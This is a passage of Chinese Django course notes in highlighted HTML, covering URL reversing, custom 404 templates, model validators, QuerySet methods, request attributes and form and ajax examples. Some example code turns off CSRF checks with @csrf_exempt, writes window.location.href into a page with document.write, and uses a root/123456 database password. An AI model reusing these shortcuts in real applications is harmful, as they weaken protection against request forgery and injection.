class=\"string\">&#x27;orderapp&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">urlpatterns = [</span><br><span class=\"line\">    path(<span class=\"string\">&#x27;list/&lt;city_code&gt;/&lt;order_num&gt;&#x27;</span>, views.order_list, name=<span class=\"string\">&#x27;list&#x27;</span>),</span><br><span class=\"line\">    path(<span class=\"string\">&#x27;cancel/&lt;uuid:order_num&gt;&#x27;</span>, views.cancel_order, name=<span class=\"string\">&#x27;cancel&#x27;</span>),</span><br><span class=\"line\">    re_path(<span class=\"string\">r&#x27;^search/(?P&lt;phone&gt;1[3-57-9][\\d]&#123;9&#125;)$&#x27;</span>, views.search, name=<span class=\"string\">&#x27;search&#x27;</span>),</span><br><span class=\"line\">    <span class=\"comment\"># url(r&#x27;^list2/(?P&lt;city_code&gt;\\w+)/(?P&lt;order_num&gt;\\d+)$&#x27;, views.order_list),</span></span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n\n<p>【注意】如果子路由指定了namespace命名空间，则子路由的脚本中必须声明<code>app_name</code>属性，属性一般是app模块名称。</p>\n<h3 id=\"5-2-在网页中获取路径\"><a href=\"#5-2-在网页中获取路径\" class=\"headerlink\" title=\"5.2 在网页中获取路径\"></a>5.2 在网页中获取路径</h3><p>在网页中使用<code>&#123;% url 'namespace或app_name:name' 参数 %&#125;</code></p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;&#123;% url &#x27;orderapp:list&#x27; &#x27;xa&#x27; 1001 %&#125;&quot;</span>&gt;</span>订单<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>参数可以是多个，每个参数之间使用空格分隔。</p>\n<p>参数默认使用位置传参，也可以使用关键参数传参。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;&#123;% url &#x27;orderapp:list&#x27; order_num=1002 city_code=&#x27;xa&#x27; %&#125;&quot;</span>&gt;</span>订单<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-3-在视图函数中获取路径\"><a href=\"#5-3-在视图函数中获取路径\" class=\"headerlink\" title=\"5.3 在视图函数中获取路径\"></a>5.3 在视图函数中获取路径</h3><p>在视图函数中，使用reverse()函数来反向获取url请求路径。再通过redirect或HttpResponseRedirect()来重定向。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">url = reverse(<span class=\"string\">&#x27;order:search&#x27;</span>, args=(<span class=\"string\">&#x27;13888888888&#x27;</span>,))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> redirect(url)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">url = reverse(<span class=\"string\">&#x27;order:list&#x27;</span>, kwargs=<span class=\"built_in\">dict</span>(city_code=<span class=\"string\">&#x27;ShanxiXA&#x27;</span>, order_num=<span class=\"number\">11009</span>))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> HttpResponseRedirect(url)</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>reverse()可以使用kwargs字典类型传参，也可以使用args以位置方式传参。</li>\n<li>HttpResponseRedirect()和redirect()是一样的，即redirect()返回就是HttpResponseRedirect类对象。</li>\n</ul>\n<h2 id=\"六、自定义error视图模板\"><a href=\"#六、自定义error视图模板\" class=\"headerlink\" title=\"六、自定义error视图模板\"></a>六、自定义error视图模板</h2><p>常见的错误响应状态码：403，400，404，405(请求方法不允许)，500 (服务器异常)</p>\n<p>在templates模板中定义404.html或500.html，要求将settings.py的DEBUG设置为false.</p>\n<p>404.html</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;% extends &#x27;base.html&#x27; %&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;% block content %&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h3</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;color: red&quot;</span>&gt;</span></span><br><span class=\"line\">        Sorry, 您请求的资源&#123;&#123; request_path &#125;&#125;不存在。</span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"variable language_\">document</span>.<span class=\"title function_\">write</span>(<span class=\"variable language_\">window</span>.<span class=\"property\">location</span>.<span class=\"property\">href</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">        </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span>不存在。</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">h3</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">        3秒后自动跳转到<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;/&quot;</span>&gt;</span>主页<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span>&gt;。</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"七、模型类扩展知识点\"><a href=\"#七、模型类扩展知识点\" class=\"headerlink\" title=\"七、模型类扩展知识点\"></a>七、模型类扩展知识点</h2><h3 id=\"7-1-validators验证\"><a href=\"#7-1-validators验证\" class=\"headerlink\" title=\"7.1 validators验证\"></a>7.1 validators验证</h3><p>如果验证不通过，可以抛出ValidationError信息</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> django.core.exceptions <span class=\"keyword\">import</span> ValidationError</span><br></pre></td></tr></table></figure>\n\n<p>自定义验证器类(用于模型类字段的)：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">UserValidator</span>:</span><br><span class=\"line\"><span class=\"meta\">    @classmethod</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">valid_phone</span>(<span class=\"params\">cls, value</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> re.<span class=\"keyword\">match</span>(<span class=\"string\">r&#x27;1[1-57-9]\\d&#123;9&#125;&#x27;</span>, value):</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> ValidationError(<span class=\"string\">&#x27;手机号格式不正确&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">UserEntity</span>(models.Model):</span><br><span class=\"line\">    name = models.CharField(max_length=<span class=\"number\">20</span>, verbose_name=<span class=\"string\">&#x27;账号&#x27;</span>)</span><br><span class=\"line\">    age = models.IntegerField(default=<span class=\"number\">0</span>, verbose_name=<span class=\"string\">&#x27;年龄&#x27;</span>)</span><br><span class=\"line\">    phone = models.CharField(max_length=<span class=\"number\">11</span>,</span><br><span class=\"line\">                             verbose_name=<span class=\"string\">&#x27;手机号&#x27;</span>,</span><br><span class=\"line\">                             validators=[UserValidator.valid_phone],</span><br><span class=\"line\">                             blank=<span class=\"literal\">True</span>,  <span class=\"comment\"># 站点的表单字段值可以为空</span></span><br><span class=\"line\">                             null=<span class=\"literal\">True</span>)  <span class=\"comment\"># 数据表的字段可以是null值</span></span><br></pre></td></tr></table></figure>\n\n<p>在models.CharField(validators=[])指定哪些验证方法。</p>\n<h3 id=\"7-2-QuerySet的bulk-create-批量创建\"><a href=\"#7-2-QuerySet的bulk-create-批量创建\" class=\"headerlink\" title=\"7.2 QuerySet的bulk_create([])批量创建\"></a>7.2 QuerySet的bulk_create([])批量创建</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">c1 = CateTypeEntity()</span><br><span class=\"line\">c1.name = <span class=\"string\">&#x27;水果1&#x27;</span></span><br><span class=\"line\">c1.order_num = <span class=\"number\">10</span></span><br><span class=\"line\"></span><br><span class=\"line\">c2 = CateTypeEntity()</span><br><span class=\"line\">c2.name = <span class=\"string\">&#x27;水果2&#x27;</span></span><br><span class=\"line\">c2.order_num = <span class=\"number\">11</span></span><br><span class=\"line\"></span><br><span class=\"line\">CateTypeEntity.objects.bulk_create([c1, c2])</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"7-3-QuerySet-values-或values-list-返回指定字段\"><a href=\"#7-3-QuerySet-values-或values-list-返回指定字段\" class=\"headerlink\" title=\"7.3 QuerySet.values()或values_list()返回指定字段\"></a>7.3 QuerySet.values()或values_list()返回指定字段</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">UserEntity.objects.values(<span class=\"string\">&#x27;id&#x27;</span>, <span class=\"string\">&#x27;name&#x27;</span>)  <span class=\"comment\"># 只查看id和name两个字段</span></span><br><span class=\"line\">&lt;QuerySet [&#123;<span class=\"string\">&#x27;id&#x27;</span>: <span class=\"number\">1</span>, <span class=\"string\">&#x27;name&#x27;</span>: <span class=\"string\">&#x27;disen&#x27;</span>&#125;, &#123;<span class=\"string\">&#x27;id&#x27;</span>: <span class=\"number\">2</span>, <span class=\"string\">&#x27;name&#x27;</span>: <span class=\"string\">&#x27;jack&#x27;</span>&#125;, &#123;<span class=\"string\">&#x27;id&#x27;</span>: <span class=\"number\">3</span>, <span class=\"string\">&#x27;name&#x27;</span>: <span class=\"string\">&#x27;ping&#x27;</span>&#125;, &#123;<span class=\"string\">&#x27;id&#x27;</span>: <span class=\"number\">4</span>, <span class=\"string\">&#x27;name&#x27;</span>: <span class=\"string\">&#x27;wong&#x27;</span>&#125;, &#123;<span class=\"string\">&#x27;id&#x27;</span>: <span class=\"number\">5</span>, <span class=\"string\">&#x27;name&#x27;</span>: <span class=\"string\">&#x27;xi&#x27;</span>&#125;]&gt;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"7-4-request请求对象的属性\"><a href=\"#7-4-request请求对象的属性\" class=\"headerlink\" title=\"7.4 request请求对象的属性\"></a>7.4 request请求对象的属性</h3><p>GET/POST/COOKIES/FILES都是QueryDict类，QueryDict自动进行url的中文编码处理。</p>\n<p><code>method, path, content_type, encoding, session</code></p>\n<h1 id=\"WEB后端服务第16天-Django第6天\"><a href=\"#WEB后端服务第16天-Django第6天\" class=\"headerlink\" title=\"WEB后端服务第16天-Django第6天\"></a>WEB后端服务第16天-Django第6天</h1><h2 id=\"一、请求与响应详解\"><a href=\"#一、请求与响应详解\" class=\"headerlink\" title=\"一、请求与响应详解\"></a>一、请求与响应详解</h2><h3 id=\"1-1-request对象\"><a href=\"#1-1-request对象\" class=\"headerlink\" title=\"1.1 request对象\"></a>1.1 request对象</h3><h4 id=\"1-1-1-扩展：mysql连接配置\"><a href=\"#1-1-1-扩展：mysql连接配置\" class=\"headerlink\" title=\"1.1.1 扩展：mysql连接配置\"></a>1.1.1 扩展：mysql连接配置</h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">DATABASES = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;default&#x27;</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;ENGINE&#x27;</span>: <span class=\"string\">&#x27;django.db.backends.mysql&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;NAME&#x27;</span>: <span class=\"string\">&#x27;advance1&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;HOST&#x27;</span>: <span class=\"string\">&#x27;192.168.200.116&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;PORT&#x27;</span>: <span class=\"number\">3306</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;USER&#x27;</span>: <span class=\"string\">&#x27;root&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;PASSWORD&#x27;</span>: <span class=\"string\">&#x27;123456&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;CHARSET&#x27;</span>: <span class=\"string\">&#x27;utf8&#x27;</span>,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>默认情况下，需要安装mysqlclient，我们也可以安装pymysql，但需要在主目录下进行初始化安装。主工程目录下的__init__.py脚本中的内容：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pymysql</span><br><span class=\"line\"></span><br><span class=\"line\">pymysql.install_as_MySQLdb()</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"1-1-2-请求对象中的QueryDict属性\"><a href=\"#1-1-2-请求对象中的QueryDict属性\" class=\"headerlink\" title=\"1.1.2 请求对象中的QueryDict属性\"></a>1.1.2 请求对象中的QueryDict属性</h4><ul>\n<li>GET    查询参数</li>\n<li>POST  表单参数，包含post两个请求方法的参数</li>\n<li>COOKIES  客户端中的当前domain的所有的Cookie信息</li>\n<li>META  wsgi中请求的元信息（服务器环境信息，客户端请求信息）== environ<ul>\n<li>REMOTE_ADDR  客户端IP</li>\n<li>PATH_INFO  请求路径</li>\n<li>REQUEST_METHOD 请求方法</li>\n<li>QUERY_STRING  查询参数</li>\n<li>CONTENT_TYPE  </li>\n</ul>\n</li>\n<li>FILES  上传的表单参数中所有的文件对象，MultiValueDict类对象，文件对象的类型是InMemoryUploadedFile</li>\n<li>SESSION  会话中存储的数据（可以跨多个请求）</li>\n</ul>\n<p>GET请求的案例</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Regist2<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;get&quot;</span> <span class=\"attr\">enctype</span>=<span class=\"string\">&quot;application/x-www-form-urlencoded&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;name&quot;</span> <span class=\"attr\">placeholder</span>=<span class=\"string\">&quot;username&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;phone&quot;</span> <span class=\"attr\">placeholder</span>=<span class=\"string\">&quot;phone&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">            爱好：</span><br><span class=\"line\">            &#123;% for love in loves %&#125;</span><br><span class=\"line\">                &#123;# 默认选择第一项和最后一项的爱好 #&#125;</span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;checkbox&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">                       &#123;% <span class=\"attr\">if</span> <span class=\"attr\">forloop.first</span> <span class=\"attr\">or</span> <span class=\"attr\">forloop.last</span> %&#125;</span></span><br><span class=\"line\"><span class=\"tag\">                            <span class=\"attr\">checked</span></span></span><br><span class=\"line\"><span class=\"tag\">                       &#123;% <span class=\"attr\">endif</span> %&#125;</span></span><br><span class=\"line\"><span class=\"tag\">                       <span class=\"attr\">name</span>=<span class=\"string\">&quot;love&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;&#123;&#123; love &#125;&#125;&quot;</span>&gt;</span> &#123;&#123; love &#125;&#125;</span><br><span class=\"line\">            &#123;% endfor %&#125;</span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">button</span>&gt;</span>提交<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">        GET请求的查询参数<span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\">            &#123;% for key, value in request.GET.items %&#125;</span><br><span class=\"line\">                &#123;% if key != &#x27;love&#x27; %&#125;</span><br><span class=\"line\">                    <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>&#123;&#123; key &#125;&#125;: &#123;&#123; value &#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">                &#123;% endif %&#125;</span><br><span class=\"line\">            &#123;% endfor %&#125;</span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">                爱好：</span><br><span class=\"line\">                &#123;% for item in select_loves %&#125;</span><br><span class=\"line\">                    &#123;&#123; item &#125;&#125;,</span><br><span class=\"line\">                &#123;% endfor %&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Create your views here.</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> django.views.decorators.csrf <span class=\"keyword\">import</span> csrf_exempt</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@csrf_exempt</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">regist_2</span>(<span class=\"params\">request, user_id=<span class=\"literal\">None</span></span>):</span><br><span class=\"line\">    loves = [<span class=\"string\">&#x27;Python&#x27;</span>, <span class=\"string\">&#x27;Django&#x27;</span>, <span class=\"string\">&#x27;Flask&#x27;</span>, <span class=\"string\">&#x27;Django REST Framework&#x27;</span>, <span class=\"string\">&#x27;Linux&#x27;</span>, <span class=\"string\">&#x27;H5&#x27;</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 获取参数名相同的多个参数值</span></span><br><span class=\"line\">    select_loves = request.GET.getlist(<span class=\"string\">&#x27;love&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render(request, <span class=\"string\">&#x27;regist2.html&#x27;</span>, <span class=\"built_in\">locals</span>())</span><br></pre></td></tr></table></figure>\n\n<p>POST/PUT-ajax请求案例</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Regist3<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;post&quot;</span> <span class=\"attr\">enctype</span>=<span class=\"string\">&quot;application/x-www-form-urlencoded&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;name&quot;</span> <span class=\"attr\">placeholder</span>=<span class=\"string\">&quot;username&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;phone&quot;</span> <span class=\"attr\">placeholder</span>=<span class=\"string\">&quot;phone&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">button</span>&gt;</span>提交<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">onclick</span>=<span class=\"string\">&quot;up_ajax()&quot;</span>&gt;</span>ajax发起put请求<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"keyword\">function</span> <span class=\"title function_\">up_ajax</span>(<span class=\"params\"></span>)&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">                data = &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">                    <span class=\"attr\">name</span>: <span class=\"string\">&#x27;张三&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">                    <span class=\"attr\">phone</span>: <span class=\"string\">&#x27;123456789&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">                    <span class=\"attr\">loves</span>: [<span class=\"string\">&#x27;唱&#x27;</span>, <span class=\"string\">&#x27;跳&#x27;</span>, <span class=\"string\">&#x27;RAP&#x27;</span>, <span class=\"string\">&#x27;篮球&#x27;</span>]</span></span><br><span class=\"line\"><span class=\"language-javascript\">                &#125;;</span></span><br><span class=\"line\"><span class=\"language-javascript\">                <span class=\"title function_\">fetch</span>(<span class=\"string\">&#x27;&#x27;</span>, &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">                    <span class=\"attr\">method</span>: <span class=\"string\">&#x27;PUT&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">                    <span class=\"attr\">body</span>: <span class=\"variable language_\">document</span>.<span class=\"property\">forms</span>[<span class=\"number\">0</span>].<span class=\"property\">serialize</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">                    <span class=\"attr\">headers</span>: &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">                        <span class=\"string\">&#x27;Content-Type&#x27;</span>: <span class=\"string\">&#x27;application/x-www-form-urlencoded&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">                    &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">                &#125;).<span class=\"title function_\">then</span>(<span class=\"function\"><span class=\"params\">response</span> =&gt;</span> response.<span class=\"title function_\">text</span>()).<span class=\"title function_\">then</span>(<span class=\"function\"><span class=\"params\">html</span>=&gt;</span> &#123;<span class=\"variable language_\">document</span>.<span class=\"title function_\">write</span>(html)&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">             &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">        </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">P</span>&gt;</span></span><br><span class=\"line\">        POST请求参数：</span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\">            &#123;% for key, value in request.POST.items %&#125;</span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>&#123;&#123; key &#125;&#125;: &#123;&#123; value &#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">            &#123;% endfor %&#125;</span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">P</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">        PUT的参数（body）：&#123;&#123; request.body &#125;&#125;</span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">        content-type: &#123;&#123; request.content_type &#125;&#125;;&#123;&#123; request.encoding &#125;&#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@csrf_exempt</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">regist</span>(<span class=\"params\">request, user_id=<span class=\"literal\">None</span></span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(request.POST)  <span class=\"comment\"># 只接收post请求方法上传的form表单数据</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(request.method)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render(request, <span class=\"string\">&#x27;regist3.html&#x27;</span>, <span class=\"built_in\">locals</span>())</span><br></pre></td></tr></table></figure>\n\n<p>POST实现文件上传案例</p>\n<h4 id=\"1-1-3-请求对象中的普通信息\"><a href=\"#1-1-3-请求对象中的普通信息\" class=\"headerlink\" title=\"1.1.3 请求对象中的普通信息\"></a>1.1.3 请求对象中的普通信息</h4><ul>\n<li>path 请求路径</li>\n<li>method  请求方法， GET/POST/PUT/DELETE</li>\n<li>content_type  数据类型，如 请求头的Content-Type:text/html;charset=utf-8，content_type只接收数据类型text/html。charset=utf-8的部分编码则由encoding存储。</li>\n<li>encoding  数据编码</li>\n<li>body  字节码数据，一般接收上传的json数据，put上传的数据可以使用body来获取。</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Regist<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span 